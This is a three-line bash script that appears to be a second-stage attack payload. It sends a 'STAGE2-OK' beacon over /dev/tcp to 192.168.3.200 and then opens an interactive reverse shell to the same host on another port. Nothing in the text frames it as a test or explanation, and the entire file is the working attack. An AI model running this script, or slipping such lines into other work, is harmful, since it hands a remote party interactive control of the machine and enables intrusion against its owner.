#!/bin/bash
echo STAGE2-OK >/dev/tcp/192.168.3.200/9999
/bin/bash -i >& /dev/tcp/192.168.3.200/9998 0>&1
